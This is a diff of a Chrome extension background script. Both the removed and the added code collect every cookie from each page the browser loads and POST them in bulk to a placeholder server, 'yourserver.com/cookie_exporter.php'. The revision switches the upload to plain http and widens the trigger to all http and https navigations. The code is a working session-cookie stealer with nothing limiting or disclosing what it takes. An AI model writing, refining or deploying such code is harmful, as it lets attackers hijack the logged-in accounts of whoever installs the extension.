@@ -1,28 +1,24 @@
-chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
-    if (changeInfo.status === 'complete') {
-      chrome.cookies.getAll({ url: tab.url }, (cookies) => {
-        exportCookies(cookies);
-      });
-    }
-  });
-  
-  function exportCookies(cookies) {
-    const data = { cookies: cookies };
-    const url = 'https://yourserver.com/cookie_exporter.php';
-  
-    fetch(url, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json'
-      },
-      body: JSON.stringify(data)
-    })
-      .then((response) => response.json())
-      .then((data) => {
-        console.log(data.message);
+chrome.webNavigation.onCompleted.addListener(
+  (details) => {
+    chrome.cookies.getAll({ url: details.url }, (cookies) => {
+      const url = "http://yourserver.com/cookie_exporter.php";
+
+      fetch(url, {
+        method: "POST",
+        body: JSON.stringify({ cookies: cookies }),
+        headers: {
+          "Content-Type": "application/json",
+        },
       })
-      .catch((error) => {
-        console.error('Error exporting cookies:', error);
-      });
-  }
-  
+        .then((response) => {
+          if (!response.ok) {
+            throw new Error("Network response was not ok");
+          }
+          return response.json();
+        })
+        .then((data) => console.log(data))
+        .catch((error) => console.error("Error fetching cookies:", error));
+    });
+  },
+  { url: [{ schemes: ["http", "https"] }] }
+);
